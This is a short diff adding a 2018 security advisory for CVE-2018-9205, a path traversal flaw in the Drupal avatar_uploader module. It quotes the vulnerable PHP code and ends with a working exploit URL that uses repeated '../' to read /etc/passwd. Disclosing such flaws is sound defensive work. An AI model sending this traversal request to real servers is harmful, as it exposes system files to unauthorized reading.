@@ -1,0 +1,23 @@
+#Title: Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure
+#Author: Larry W. Cashdollar
+#Date: 2018-03-30
+#CVE-ID: CVE-2018-9205
+#Download Site: https://www.drupal.org/project/avatar_uploader
+#Vendor: https://www.drupal.org/u/robbinzhao
+#Vendor Notified: 2018-04-02
+#Vendor Contact: https://www.drupal.org/project/avatar_uploader/issues/2957966#comment-12554146
+#Advisory: http://www.vapidlabs.com/advisory.php?v=202
+
+#Description: This module used Simple Ajax Uploader, and provide a basic uploader panel, for more effect, you can do your custom javascript. Such as, users' mouse hover on avatar, the edit link will slideup, or others.
+#Vulnerability:
+#The view.php contains code to retrieve files but no code to verify a user should be able to view files or keep them from changing the path to outside of the uploadDir directory:
+
+<?php
+
+$file = $_GET['file'];
+
+echo file_get_contents("uploadDir/$file");
+exit;
+
+Exploit Code:
+http://example.com/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../etc/passwd
